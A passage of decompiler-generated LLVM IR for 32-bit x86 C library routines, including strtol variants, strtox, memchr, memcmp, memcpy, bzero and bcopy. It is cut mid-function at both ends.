  %v5_804e111 = call i32 @trinkle(i32 %v2_804e044, i32* %v4_804e111, i32 1, i32 %v2_804df36)
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  %v0_804e11d = call i32 @shl()
  %v3_804e126 = load i32, i32* %stack_var_-24, align 4
  %v4_804e126 = or i32 %v3_804e126, 1
  store i32 %v4_804e126, i32* %stack_var_-24, align 4
  %v0_804e131 = load i32, i32* @edi, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-232.0, i32* @eax, align 4
  %v4_804e145 = inttoptr i32 %v0_804e131 to i32*
  %v5_804e145 = call i32 @trinkle(i32 %v2_804e044, i32* %v4_804e145, i32 1, i32 %v2_804df36)
  br label %dec_label_pc_804e14d

dec_label_pc_804e14d:                             ; preds = %dec_label_pc_804e0ae, %dec_label_pc_804e0c7
  %storemerge50 = phi i32 [ %v1_804e0bd, %dec_label_pc_804e0ae ], [ %v5_804e145, %dec_label_pc_804e0c7 ]
  %v0_804e18814 = phi i32 [ %v1_804e0bd, %dec_label_pc_804e0ae ], [ %v5_804e145, %dec_label_pc_804e0c7 ]
  store i32 %storemerge50, i32* %eax.global-to-local, align 4
  store i32 %v1_804df75, i32* %edx.global-to-local, align 4
  %v5_804e151 = sub i32 %stack_var_-232.0, %arg3
  %v0_804e155 = load i32, i32* @ebp, align 4
  %v5_804e155 = sub i32 %v0_804e155, %arg3
  store i32 %v5_804e155, i32* @ebp, align 4
  br label %dec_label_pc_804e159

dec_label_pc_804e159:                             ; preds = %dec_label_pc_804e070, %dec_label_pc_804e14d
  %v0_804e18813 = phi i32 [ %v5_804e092, %dec_label_pc_804e070 ], [ %v0_804e18814, %dec_label_pc_804e14d ]
  %stack_var_-232.0 = phi i32 [ %v5_804e099, %dec_label_pc_804e070 ], [ %v5_804e151, %dec_label_pc_804e14d ]
  %v0_804e159 = load i32, i32* @edi, align 4
  %v1_804e159 = add i32 %v0_804e159, -1
  %v9_804e159 = icmp eq i32 %v1_804e159, 0
  %v1_804e15c = icmp eq i1 %v9_804e159, false
  br i1 %v1_804e15c, label %dec_label_pc_804e0ac, label %dec_label_pc_804e162

dec_label_pc_804e162:                             ; preds = %dec_label_pc_804e159
  %v3_804e162 = load i32, i32* %stack_var_-24, align 4
  %v12_804e162 = icmp eq i32 %v3_804e162, 1
  %v1_804e16a = icmp eq i1 %v12_804e162, false
  br i1 %v1_804e16a, label %dec_label_pc_804e0ae, label %dec_label_pc_804e170

dec_label_pc_804e170:                             ; preds = %dec_label_pc_804e162
  br label %dec_label_pc_804e17e

dec_label_pc_804e17e:                             ; preds = %entry.dec_label_pc_804e17e_crit_edge, %dec_label_pc_804e170
  %v0_804e188 = phi i32 [ %v0_804e18813, %dec_label_pc_804e170 ], [ %v0_804e188.pre, %entry.dec_label_pc_804e17e_crit_edge ]
  store i32 %v0_804defe, i32* @ebx, align 4
  ret i32 %v0_804e188

; uselistorder directives
  uselistorder i32 %v0_804e159, { 2, 0, 1 }
  uselistorder i32 %stack_var_-232.0, { 2, 1, 3, 0 }
  uselistorder i32 %v5_804e145, { 1, 0 }
  uselistorder i32 %v1_804e0bd, { 1, 0 }
  uselistorder i32 %v5_804e064, { 1, 0 }
  uselistorder i32 %v5_804e05d, { 1, 2, 3, 0 }
  uselistorder i32 %v4_804e055, { 1, 0 }
  uselistorder i32 %v0_804e026, { 1, 0 }
  uselistorder i32 %v1_804df92, { 1, 0 }
  uselistorder i32 %v0_804e00748, { 2, 1, 0 }
  uselistorder i32 %v0_804e068.pre, { 1, 0, 2 }
  uselistorder i32 %v2_804e044, { 9, 4, 8, 3, 2, 6, 5, 7, 1, 0, 13, 12, 11, 10 }
  uselistorder i32 %v1_804df51, { 1, 0 }
  uselistorder i32 %v1_804df4e, { 0, 2, 1 }
  uselistorder i32 %v2_804df36, { 3, 4, 7, 5, 0, 1, 2, 6, 8 }
  uselistorder i32* %stack_var_-24, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 7, 8, 9, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 10, 11, 12, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @pntz, { 1, 0 }
  uselistorder i32 ()* @shl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @trinkle, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @shr, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sift, { 1, 2, 0 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 4, 3, 17, 16, 15, 14, 13, 5, 0, 12, 11, 10, 2, 1, 6, 9, 8, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e17e, { 1, 0 }
  uselistorder label %dec_label_pc_804e159, { 1, 0 }
  uselistorder label %dec_label_pc_804e14d, { 1, 0 }
  uselistorder label %dec_label_pc_804e055, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e023, { 1, 0 }
  uselistorder label %dec_label_pc_804df8b, { 1, 0 }
}

define i32 @strtox(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %v0_804e18c = load i32, i32* @ebp, align 4
  %v0_804e18d = load i32, i32* @edi, align 4
  %v0_804e18e = load i32, i32* @esi, align 4
  %v0_804e18f = load i32, i32* @eax, align 4
  store i32 %v0_804e18f, i32* @esi, align 4
  %v0_804e191 = load i32, i32* @ebx, align 4
  %v2_804e198 = icmp slt i32 %v0_804e18f, 0
  %v0_804e19a = load i32, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804e1a5 = load i32, i32* @ecx, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_804e1b0 = icmp eq i1 %v2_804e198, false
  br i1 %v1_804e1b0, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1c6

dec_label_pc_804e1bc:                             ; preds = %entry
  %v1_804e1bc = add i32 %v0_804e18f, 2147483647
  br label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %entry, %dec_label_pc_804e1bc
  %storemerge = phi i32 [ %v1_804e1bc, %dec_label_pc_804e1bc ], [ -1, %entry ]
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804e1e3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804e1e3, i32* @ebx, align 4
  %v3_804e1e8 = call i32 @__shlim(i32 %v2_804e1e3, i32 0, i32 0)
  %v0_804e1f0 = load i32, i32* @edi, align 4
  %v4_804e1f8 = sext i32 %v2_804e1e3 to i64
  %v5_804e1f8 = call i32 @__intscan(i64 %v4_804e1f8, i32 %v0_804e1a5, i32 1, i32 %v0_804e1f0)
  %v4_804e200 = icmp eq i32 %v0_804e19a, 0
  %v0_804e205 = load i32, i32* @edx, align 4
  store i32 %v0_804e205, i32* %ecx.global-to-local, align 4
  store i32 %v5_804e1f8, i32* %edx.global-to-local, align 4
  br i1 %v4_804e200, label %dec_label_pc_804e223, label %dec_label_pc_804e20b

dec_label_pc_804e20b:                             ; preds = %dec_label_pc_804e1c6
  %v5_804e20f = sub i32 %v0_804e18f, %storemerge
  %v5_804e217 = add i32 %v5_804e20f, %tmp
  %v0_804e21e = load i32, i32* @esi, align 4
  %v2_804e21e = add i32 %v0_804e21e, %v5_804e217
  %v2_804e221 = inttoptr i32 %v0_804e19a to i32*
  store i32 %v2_804e21e, i32* %v2_804e221, align 4
  %v0_804e229.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804e22c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e223

dec_label_pc_804e223:                             ; preds = %dec_label_pc_804e1c6, %dec_label_pc_804e20b
  %v0_804e22c = phi i32 [ %v0_804e205, %dec_label_pc_804e1c6 ], [ %v0_804e22c.pre, %dec_label_pc_804e20b ]
  %v0_804e229 = phi i32 [ %v5_804e1f8, %dec_label_pc_804e1c6 ], [ %v0_804e229.pre, %dec_label_pc_804e20b ]
  store i32 %v0_804e191, i32* @ebx, align 4
  store i32 %v0_804e22c, i32* @edx, align 4
  store i32 %v0_804e18e, i32* @esi, align 4
  store i32 %v0_804e18d, i32* @edi, align 4
  store i32 %v0_804e18c, i32* @ebp, align 4
  ret i32 %v0_804e229

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder label %dec_label_pc_804e223, { 1, 0 }
  uselistorder label %dec_label_pc_804e1c6, { 1, 0 }
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @ecx, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v2_804e248 = call i32 @strtox(i32 -2147483648, i32 0)
  ret i32 %v2_804e248
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @ecx, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v2_804e264 = call i32 @strtox(i32 -1, i32 0)
  ret i32 %v2_804e264
}

define i32 @strtoll() local_unnamed_addr {
entry:
  %v2_804e289 = call i32 @strtox(i32 0, i32 -2147483648)
  ret i32 %v2_804e289
}

define i64 @strtoimax(i8* %nptr, i8** %endptr, i32 %base) local_unnamed_addr {
entry:
  %v0_804e28e = call i32 @strtoll()
  %v1_804e28e = sext i32 %v0_804e28e to i64
  ret i64 %v1_804e28e
}

define i32 @strtoull(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v2_804e2af = call i32 @strtox(i32 -1, i32 -1)
  ret i32 %v2_804e2af

; uselistorder directives
  uselistorder i32 (i32, i32)* @strtox, { 3, 2, 1, 0 }
}

define i64 @strtoumax(i8* %nptr, i8** %endptr, i32 %base) local_unnamed_addr {
entry:
  %v4_804e2b4 = call i32 @strtoull(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v5_804e2b4 = sext i32 %v4_804e2b4 to i64
  ret i64 %v5_804e2b4
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804e2d0 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_804e2d0
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804e2fa = inttoptr i32 %arg1 to i8*
  %v4_804e2fa = call i32 @memset(i8* %v3_804e2fa, i32 0, i32 %arg2)
  ret i32 %v4_804e2fa
}

define i32 @memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804e312 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804e317 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e317, i32* @edx, align 4
  %v4_804e31b4 = urem i32 %arg2, 256
  %v1_804e320 = icmp eq i32 %arg3, 0
  %v1_804e322 = icmp eq i1 %v1_804e320, false
  %v2_804e322 = zext i1 %v1_804e322 to i32
  %v4_804e322 = and i32 %v0_804e312, -256
  %v5_804e322 = or i32 %v4_804e322, %v2_804e322
  %v2_804e325 = urem i32 %v4_804e317, 4
  %v3_804e325 = icmp eq i32 %v2_804e325, 0
  %v1_804e328 = icmp eq i1 %v3_804e325, false
  br i1 %v1_804e328, label %dec_label_pc_804e355, label %dec_label_pc_804e32a

dec_label_pc_804e32a:                             ; preds = %dec_label_pc_804e347, %dec_label_pc_804e340, %entry
  %v0_804e363 = phi i32 [ %arg3, %entry ], [ %v1_804e34a, %dec_label_pc_804e347 ], [ %v0_804e34a, %dec_label_pc_804e340 ]
  %v1_804e372 = phi i32 [ %v4_804e317, %entry ], [ %v1_804e347, %dec_label_pc_804e347 ], [ %v0_804e347, %dec_label_pc_804e340 ]
  %v0_804e32a = phi i32 [ %v5_804e322, %entry ], [ %v5_804e34d, %dec_label_pc_804e347 ], [ %v3_804e34d, %dec_label_pc_804e340 ]
  %v3_804e32a = trunc i32 %v0_804e32a to i8
  %v4_804e32a = icmp eq i8 %v3_804e32a, 0
  br i1 %v4_804e32a, label %dec_label_pc_804e359, label %dec_label_pc_804e32e

dec_label_pc_804e32e:                             ; preds = %dec_label_pc_804e32a
  %v1_804e32e = inttoptr i32 %v1_804e372 to i8*
  %v2_804e32e = load i8, i8* %v1_804e32e, align 1
  %v3_804e32e = zext i8 %v2_804e32e to i32
  %v12_804e331 = icmp eq i32 %v3_804e32e, %v4_804e31b4
  %v1_804e333 = icmp eq i1 %v12_804e331, false
  br i1 %v1_804e333, label %dec_label_pc_804e363, label %dec_label_pc_804e335

dec_label_pc_804e335:                             ; preds = %dec_label_pc_804e3a2, %dec_label_pc_804e397, %dec_label_pc_804e32e, %dec_label_pc_804e359
  %v0_804e336 = phi i32 [ %v0_804e397, %dec_label_pc_804e397 ], [ %v1_804e372, %dec_label_pc_804e32e ], [ %v0_804e33632, %dec_label_pc_804e359 ], [ %v1_804e3a2, %dec_label_pc_804e3a2 ]
  store i32 %v0_804e312, i32* @ebx, align 4
  ret i32 %v0_804e336

dec_label_pc_804e340:                             ; preds = %dec_label_pc_804e355
  %v1_804e340 = inttoptr i32 %v0_804e347 to i8*
  %v2_804e340 = load i8, i8* %v1_804e340, align 1
  %v3_804e340 = zext i8 %v2_804e340 to i32
  %v12_804e343 = icmp eq i32 %v3_804e340, %v4_804e31b4
  br i1 %v12_804e343, label %dec_label_pc_804e32a, label %dec_label_pc_804e347

dec_label_pc_804e347:                             ; preds = %dec_label_pc_804e340
  %v1_804e347 = add i32 %v0_804e347, 1
  store i32 %v1_804e347, i32* @edx, align 4
  %v1_804e34a = add i32 %v0_804e34a, -1
  %v9_804e34a = icmp eq i32 %v1_804e34a, 0
  store i32 %v1_804e34a, i32* @ecx, align 4
  %v1_804e34d = icmp eq i1 %v9_804e34a, false
  %v2_804e34d = zext i1 %v1_804e34d to i32
  %v4_804e34d = and i32 %v3_804e34d, -256
  %v5_804e34d = or i32 %v2_804e34d, %v4_804e34d
  %v2_804e350 = urem i32 %v1_804e347, 4
  %v3_804e350 = icmp eq i32 %v2_804e350, 0
  br i1 %v3_804e350, label %dec_label_pc_804e32a, label %dec_label_pc_804e355

dec_label_pc_804e355:                             ; preds = %entry, %dec_label_pc_804e347
  %v0_804e34a = phi i32 [ %v1_804e34a, %dec_label_pc_804e347 ], [ %arg3, %entry ]
  %v0_804e347 = phi i32 [ %v1_804e347, %dec_label_pc_804e347 ], [ %v4_804e317, %entry ]
  %v3_804e34d = phi i32 [ %v5_804e34d, %dec_label_pc_804e347 ], [ %v5_804e322, %entry ]
  %v3_804e355 = trunc i32 %v3_804e34d to i8
  %v4_804e355 = icmp eq i8 %v3_804e355, 0
  %v1_804e357 = icmp eq i1 %v4_804e355, false
  br i1 %v1_804e357, label %dec_label_pc_804e340, label %dec_label_pc_804e359

dec_label_pc_804e359:                             ; preds = %dec_label_pc_804e355, %dec_label_pc_804e32a
  %v0_804e33632 = phi i32 [ %v1_804e372, %dec_label_pc_804e32a ], [ %v0_804e347, %dec_label_pc_804e355 ]
  %v0_804e359 = phi i32 [ %v0_804e363, %dec_label_pc_804e32a ], [ %v0_804e34a, %dec_label_pc_804e355 ]
  %v1_804e359 = icmp eq i32 %v0_804e359, 0
  %v1_804e35b = icmp eq i1 %v1_804e359, false
  br i1 %v1_804e35b, label %dec_label_pc_804e335, label %dec_label_pc_804e35d

dec_label_pc_804e35d:                             ; preds = %dec_label_pc_804e359
  br label %dec_label_pc_804e35f

dec_label_pc_804e35f:                             ; preds = %dec_label_pc_804e3ba, %dec_label_pc_804e3b2, %dec_label_pc_804e35d
  store i32 %v0_804e312, i32* @ebx, align 4
  ret i32 0

dec_label_pc_804e363:                             ; preds = %dec_label_pc_804e32e
  %tmp = icmp ult i32 %v0_804e363, 4
  br i1 %tmp, label %dec_label_pc_804e3b6, label %dec_label_pc_804e36a

dec_label_pc_804e36a:                             ; preds = %dec_label_pc_804e363
  %v3_804e36a = mul nuw i32 %v4_804e31b4, 16843009
  br label %dec_label_pc_804e385

dec_label_pc_804e376:                             ; preds = %dec_label_pc_804e385
  %v1_804e376 = add i32 %v0_804e376, -4
  store i32 %v1_804e376, i32* @ecx, align 4
  %v1_804e379 = add i32 %v0_804e379, 4
  %tmp50 = icmp ult i32 %v1_804e376, 4
  br i1 %tmp50, label %dec_label_pc_804e3b6.loopexit, label %dec_label_pc_804e385

dec_label_pc_804e385:                             ; preds = %dec_label_pc_804e376, %dec_label_pc_804e36a
  %v0_804e379 = phi i32 [ %v1_804e372, %dec_label_pc_804e36a ], [ %v1_804e379, %dec_label_pc_804e376 ]
  %v0_804e376 = phi i32 [ %v0_804e363, %dec_label_pc_804e36a ], [ %v1_804e376, %dec_label_pc_804e376 ]
  %v3_804e372.pn.in = inttoptr i32 %v0_804e379 to i32*
  %v3_804e372.pn = load i32, i32* %v3_804e372.pn.in, align 4
  %storemerge6.in = xor i32 %v3_804e372.pn, %v3_804e36a
  %v1_804e385 = add i32 %storemerge6.in, -16843009
  %v1_804e38b = sub i32 -1, %storemerge6.in
  %v2_804e38d = and i32 %v1_804e38b, -2139062144
  %v1_804e38f = and i32 %v2_804e38d, %v1_804e385
  %v2_804e38f = icmp eq i32 %v1_804e38f, 0
  store i32 %v1_804e38f, i32* @edx, align 4
  br i1 %v2_804e38f, label %dec_label_pc_804e376, label %dec_label_pc_804e397.loopexit

dec_label_pc_804e397.loopexit:                    ; preds = %dec_label_pc_804e385
  br label %dec_label_pc_804e397

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e397.loopexit, %dec_label_pc_804e3b6
  %v0_804e3ac25 = phi i32 [ %v0_804e376, %dec_label_pc_804e397.loopexit ], [ %v0_804e3b6, %dec_label_pc_804e3b6 ]
  %v0_804e397 = phi i32 [ %v0_804e379, %dec_label_pc_804e397.loopexit ], [ %v0_804e39724, %dec_label_pc_804e3b6 ]
  %v1_804e397 = inttoptr i32 %v0_804e397 to i8*
  %v2_804e397 = load i8, i8* %v1_804e397, align 1
  %v3_804e397 = zext i8 %v2_804e397 to i32
  store i32 %v0_804e397, i32* @edx, align 4
  %v12_804e39c = icmp eq i32 %v3_804e397, %v4_804e31b4
  %v1_804e39e = icmp eq i1 %v12_804e39c, false
  br i1 %v1_804e39e, label %dec_label_pc_804e3ac, label %dec_label_pc_804e335

dec_label_pc_804e3a2:                             ; preds = %dec_label_pc_804e3ac
  %v1_804e3a2 = add i32 %v0_804e3a2, 1
  store i32 %v1_804e3a2, i32* @edx, align 4
  %v1_804e3a5 = inttoptr i32 %v1_804e3a2 to i8*
  %v2_804e3a5 = load i8, i8* %v1_804e3a5, align 1
  %v3_804e3a5 = zext i8 %v2_804e3a5 to i32
  %v12_804e3a8 = icmp eq i32 %v3_804e3a5, %v4_804e31b4
  br i1 %v12_804e3a8, label %dec_label_pc_804e335, label %dec_label_pc_804e3ac

dec_label_pc_804e3ac:                             ; preds = %dec_label_pc_804e397, %dec_label_pc_804e3a2
  %v0_804e3a2 = phi i32 [ %v1_804e3a2, %dec_label_pc_804e3a2 ], [ %v0_804e397, %dec_label_pc_804e397 ]
  %v0_804e3ac = phi i32 [ %v1_804e3ac, %dec_label_pc_804e3a2 ], [ %v0_804e3ac25, %dec_label_pc_804e397 ]
  %v1_804e3ac = add i32 %v0_804e3ac, -1
  %v9_804e3ac = icmp eq i32 %v1_804e3ac, 0
  store i32 %v1_804e3ac, i32* @ecx, align 4
  %v1_804e3b0 = icmp eq i1 %v9_804e3ac, false
  br i1 %v1_804e3b0, label %dec_label_pc_804e3a2, label %dec_label_pc_804e3b2

dec_label_pc_804e3b2:                             ; preds = %dec_label_pc_804e3ac
  br label %dec_label_pc_804e35f

dec_label_pc_804e3b6.loopexit:                    ; preds = %dec_label_pc_804e376
  br label %dec_label_pc_804e3b6

dec_label_pc_804e3b6:                             ; preds = %dec_label_pc_804e3b6.loopexit, %dec_label_pc_804e363
  %v0_804e39724 = phi i32 [ %v1_804e379, %dec_label_pc_804e3b6.loopexit ], [ %v1_804e372, %dec_label_pc_804e363 ]
  %v0_804e3b6 = phi i32 [ %v1_804e376, %dec_label_pc_804e3b6.loopexit ], [ %v0_804e363, %dec_label_pc_804e363 ]
  %v1_804e3b6 = icmp eq i32 %v0_804e3b6, 0
  %v1_804e3b8 = icmp eq i1 %v1_804e3b6, false
  br i1 %v1_804e3b8, label %dec_label_pc_804e397, label %dec_label_pc_804e3ba

dec_label_pc_804e3ba:                             ; preds = %dec_label_pc_804e3b6
  br label %dec_label_pc_804e35f

; uselistorder directives
  uselistorder i32 %v0_804e3b6, { 1, 0 }
  uselistorder i32 %v1_804e3ac, { 2, 1, 0 }
  uselistorder i32 %v1_804e3a2, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804e397, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e376, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e34d, { 2, 0, 1 }
  uselistorder i32 %v0_804e347, { 0, 1, 3, 2 }
  uselistorder i32 %v5_804e34d, { 1, 0 }
  uselistorder i32 %v1_804e34a, { 1, 3, 2, 0 }
  uselistorder i32 %v1_804e347, { 2, 0, 3, 1 }
  uselistorder i32 %v1_804e372, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e363, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804e31b4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v4_804e317, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e312, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e3ac, { 1, 0 }
  uselistorder label %dec_label_pc_804e397, { 1, 0 }
  uselistorder label %dec_label_pc_804e355, { 1, 0 }
  uselistorder label %dec_label_pc_804e335, { 0, 1, 3, 2 }
}

define i32 @memcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804e3d7 = ptrtoint i8* %arg1 to i32
  %v1_804e3df = icmp eq i32 %arg3, 0
  br i1 %v1_804e3df, label %dec_label_pc_804e40a, label %dec_label_pc_804e3e3

dec_label_pc_804e3e3:                             ; preds = %entry
  %v2_804e3e3 = load i8, i8* %arg1, align 1
  %v1_804e3e6 = inttoptr i32 %arg2 to i8*
  %v2_804e3e6 = load i8, i8* %v1_804e3e6, align 1
  %v15_804e3e9 = icmp eq i8 %v2_804e3e3, %v2_804e3e6
  %v1_804e3eb = icmp eq i1 %v15_804e3e9, false
  br i1 %v1_804e3eb, label %dec_label_pc_804e412, label %dec_label_pc_804e3ed

dec_label_pc_804e3ed:                             ; preds = %dec_label_pc_804e3e3
  store i32 %v4_804e3d7, i32* @ecx, align 4
  br label %dec_label_pc_804e405

dec_label_pc_804e3f3:                             ; preds = %dec_label_pc_804e405
  %v1_804e3f3 = add i32 %v0_804e3f3, 1
  %v2_804e3f3 = inttoptr i32 %v1_804e3f3 to i8*
  %v3_804e3f3 = load i8, i8* %v2_804e3f3, align 1
  store i32 %v1_804e3f3, i32* @ecx, align 4
  %v1_804e3fa = add i32 %v0_804e3fa, 1
  %v2_804e3fa = inttoptr i32 %v1_804e3fa to i8*
  %v3_804e3fa = load i8, i8* %v2_804e3fa, align 1
  %v15_804e401 = icmp eq i8 %v3_804e3f3, %v3_804e3fa
  %v1_804e403 = icmp eq i1 %v15_804e401, false
  br i1 %v1_804e403, label %dec_label_pc_804e412, label %dec_label_pc_804e405

dec_label_pc_804e405:                             ; preds = %dec_label_pc_804e3f3, %dec_label_pc_804e3ed
  %v0_804e3fa = phi i32 [ %v1_804e3fa, %dec_label_pc_804e3f3 ], [ %arg2, %dec_label_pc_804e3ed ]
  %v0_804e3f3 = phi i32 [ %v1_804e3f3, %dec_label_pc_804e3f3 ], [ %v4_804e3d7, %dec_label_pc_804e3ed ]
  %v0_804e405 = phi i32 [ %v1_804e405, %dec_label_pc_804e3f3 ], [ %arg3, %dec_label_pc_804e3ed ]
  %v1_804e405 = add i32 %v0_804e405, -1
  %v9_804e405 = icmp eq i32 %v1_804e405, 0
  %v1_804e408 = icmp eq i1 %v9_804e405, false
  br i1 %v1_804e408, label %dec_label_pc_804e3f3, label %dec_label_pc_804e40a

dec_label_pc_804e40a:                             ; preds = %dec_label_pc_804e405, %entry
  ret i32 0

dec_label_pc_804e412:                             ; preds = %dec_label_pc_804e3f3, %dec_label_pc_804e3e3
  %v0_804e415.in = phi i8 [ %v2_804e3e6, %dec_label_pc_804e3e3 ], [ %v3_804e3fa, %dec_label_pc_804e3f3 ]
  %v0_804e412.in = phi i8 [ %v2_804e3e3, %dec_label_pc_804e3e3 ], [ %v3_804e3f3, %dec_label_pc_804e3f3 ]
  %v0_804e412 = zext i8 %v0_804e412.in to i32
  %v0_804e415 = zext i8 %v0_804e415.in to i32
  %v2_804e419 = sub nsw i32 %v0_804e412, %v0_804e415
  ret i32 %v2_804e419

; uselistorder directives
  uselistorder i32 %v1_804e405, { 1, 0 }
  uselistorder i8 %v3_804e3fa, { 1, 0 }
  uselistorder i8 %v3_804e3f3, { 1, 0 }
  uselistorder i8 %v2_804e3e6, { 1, 0 }
  uselistorder i8 %v2_804e3e3, { 1, 0 }
}

define i32 @memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e421 = load i32, i32* @edi, align 4
  store i32 %v0_804e421, i32* %stack_var_-8, align 4
  %v4_804e422 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e422, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v5_804e430 = icmp ult i32 %arg3, 4
  br i1 %v5_804e430, label %dec_label_pc_804e447, label %dec_label_pc_804e435

dec_label_pc_804e435:                             ; preds = %entry
  %v1_804e435 = urem i32 %v4_804e422, 4
  %v2_804e435 = icmp eq i32 %v1_804e435, 0
  br i1 %v2_804e435, label %dec_label_pc_804e447, label %dec_label_pc_804e43d

dec_label_pc_804e43d:                             ; preds = %dec_label_pc_804e435, %dec_label_pc_804e43d
  %v3_804e43d = phi i32 [ %v9_804e43d, %dec_label_pc_804e43d ], [ %v4_804e422, %dec_label_pc_804e435 ]
  %v0_804e43d = phi i32 [ %v10_804e43d, %dec_label_pc_804e43d ], [ %arg2, %dec_label_pc_804e435 ]
  %v1_804e43d = inttoptr i32 %v0_804e43d to i8*
  %v2_804e43d = load i8, i8* %v1_804e43d, align 1
  %v4_804e43d = inttoptr i32 %v3_804e43d to i8*
  store i8 %v2_804e43d, i8* %v4_804e43d, align 1
  %v5_804e43d = load i32, i32* %edi.global-to-local, align 4
  %v6_804e43d = load i32, i32* %esi.global-to-local, align 4
  %v7_804e43d = load i1, i1* @df, align 1
  %v8_804e43d = select i1 %v7_804e43d, i32 -1, i32 1
  %v9_804e43d = add i32 %v8_804e43d, %v5_804e43d
  %v10_804e43d = add i32 %v8_804e43d, %v6_804e43d
  store i32 %v9_804e43d, i32* %edi.global-to-local, align 4
  store i32 %v10_804e43d, i32* %esi.global-to-local, align 4
  %v0_804e43e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e43e = add i32 %v0_804e43e, -1
  store i32 %v1_804e43e, i32* %ecx.global-to-local, align 4
  %v1_804e43f = urem i32 %v9_804e43d, 4
  %v2_804e43f = icmp eq i32 %v1_804e43f, 0
  %v1_804e445 = icmp eq i1 %v2_804e43f, false
  br i1 %v1_804e445, label %dec_label_pc_804e43d, label %dec_label_pc_804e447

dec_label_pc_804e447:                             ; preds = %dec_label_pc_804e43d, %dec_label_pc_804e435, %entry
  %v1_804e44c = phi i32 [ %arg2, %dec_label_pc_804e435 ], [ %arg2, %entry ], [ %v10_804e43d, %dec_label_pc_804e43d ]
  %v0_804e44c = phi i32 [ %v4_804e422, %dec_label_pc_804e435 ], [ %v4_804e422, %entry ], [ %v9_804e43d, %dec_label_pc_804e43d ]
  %v0_804e447 = phi i32 [ %arg3, %dec_label_pc_804e435 ], [ %arg3, %entry ], [ %v1_804e43e, %dec_label_pc_804e43d ]
  store i32 %v0_804e447, i32* %edx.global-to-local, align 4
  %v2_804e449 = udiv i32 %v0_804e447, 4
  store i32 %v2_804e449, i32* %ecx.global-to-local, align 4
  %v3_804e44c = inttoptr i32 %v1_804e44c to i8*
  %v4_804e44c = inttoptr i32 %v0_804e44c to i8*
  %v5_804e44c = call i8* @_memcpy(i8* %v4_804e44c, i8* %v3_804e44c, i32 %v2_804e449)
  %v6_804e44c = ptrtoint i8* %v5_804e44c to i32
  store i32 %v6_804e44c, i32* @ecx, align 4
  %v0_804e44e = load i32, i32* %edx.global-to-local, align 4
  %v1_804e44e = urem i32 %v0_804e44e, 4
  %v2_804e44e = icmp eq i32 %v1_804e44e, 0
  store i32 %v1_804e44e, i32* @edx, align 4
  br i1 %v2_804e44e, label %dec_label_pc_804e457, label %dec_label_pc_804e453.preheader

